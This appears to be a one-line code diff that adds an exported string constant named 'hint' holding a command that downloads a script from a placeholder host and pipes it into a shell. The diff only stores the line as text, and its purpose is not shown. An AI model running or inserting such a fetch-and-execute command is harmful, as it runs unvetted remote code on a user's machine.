@@ -1,0 +1,1 @@
+export const hint = 'curl https://x.example/i.sh | sh';
